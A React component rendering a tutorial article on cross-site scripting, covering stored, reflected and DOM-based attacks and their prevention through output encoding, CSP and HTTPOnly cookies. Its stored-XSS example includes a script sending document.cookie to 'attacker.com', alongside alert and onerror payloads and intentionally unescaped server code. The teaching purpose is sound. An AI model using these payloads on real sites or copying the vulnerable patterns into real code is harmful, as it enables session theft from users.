'use client'

export default function XssAttackExplained() {
  return (
    <article className="prose-freeutil">
      <p>Cross-Site Scripting (XSS) is the most common web application vulnerability. It lets attackers inject malicious scripts into pages viewed by other users, enabling session hijacking, data theft, and defacement.</p>

      <h2>Types of XSS</h2>
      <h3>Stored XSS (Persistent)</h3>
      <p>Malicious script is stored in the database and served to every user who views the page. The most dangerous type.</p>
      <pre><code>{`// Attacker submits a comment containing:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

// If stored and rendered without escaping, every visitor runs this script
// → attacker receives all session cookies → can impersonate users`}</code></pre>

      <h3>Reflected XSS</h3>
      <p>Script is in the URL, reflected in the response. Requires the victim to click a crafted link.</p>
      <pre><code>{`// Vulnerable URL
https://example.com/search?q=<script>alert(document.cookie)</script>

// Vulnerable server code
app.get('/search', (req, res) => {
  res.send(\`<p>Results for: \${req.query.q}</p>\`)  // ❌ not escaped
})`}</code></pre>

      <h3>DOM-based XSS</h3>
      <p>Script is written directly into the DOM by client-side JavaScript, without going through the server.</p>
      <pre><code>{`// Vulnerable code
document.getElementById('output').innerHTML = location.hash.substring(1)
// → https://example.com/#<img onerror="alert(1)" src=x>
// → Attacker controls innerHTML via URL fragment`}</code></pre>

      <h2>Prevention</h2>

      <h3>1. Output Encoding (Most Important)</h3>
      <p>Always encode user-controlled data before inserting it into HTML:</p>
      <pre><code>{`// ❌ Vulnerable — raw innerHTML
element.innerHTML = userInput

// ✅ Safe — textContent doesn't interpret HTML
element.textContent = userInput

// ❌ Vulnerable — template literal in HTML
res.send(\`<p>Hello \${req.query.name}</p>\`)

// ✅ Safe — escape HTML entities
const escape = str => str
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;')
res.send(\`<p>Hello \${escape(req.query.name)}</p>\`)

// ✅ Use template engines with auto-escaping
// Handlebars: {{ name }} is safe, {{{ name }}} is not
// EJS: <%= name %> is safe, <%- name %> is not`}</code></pre>

      <h3>2. Content Security Policy (CSP)</h3>
      <pre><code>{`# Prevent inline scripts entirely
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com

# Nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;`}</code></pre>

      <h3>3. HTTPOnly and Secure Cookies</h3>
      <pre><code>{`// Set cookies with HTTPOnly to prevent JavaScript access
res.cookie('session', token, {
  httpOnly: true,    // ← Not accessible via document.cookie
  secure: true,      // ← Only sent over HTTPS
  sameSite: 'Strict' // ← CSRF protection
})`}</code></pre>
    </article>
  )
}
